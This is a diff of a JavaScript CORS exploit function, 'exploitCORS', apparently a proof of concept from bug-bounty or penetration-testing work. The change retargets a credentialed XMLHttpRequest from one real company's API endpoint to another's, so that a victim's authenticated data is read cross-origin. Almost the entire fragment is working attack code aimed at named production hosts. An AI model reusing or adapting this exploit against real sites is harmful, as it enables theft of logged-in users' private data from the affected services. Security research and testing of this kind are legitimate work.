@@ -16,7 +16,7 @@
 function exploitCORS(){
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get','https://vera-devel.api.verily.com/info',true);
+    req.open('get','https://1.sonic.fdp.api.flipkart.com/4/data/collector/business',true);
     req.withCredentials = true;
     req.send();
 }
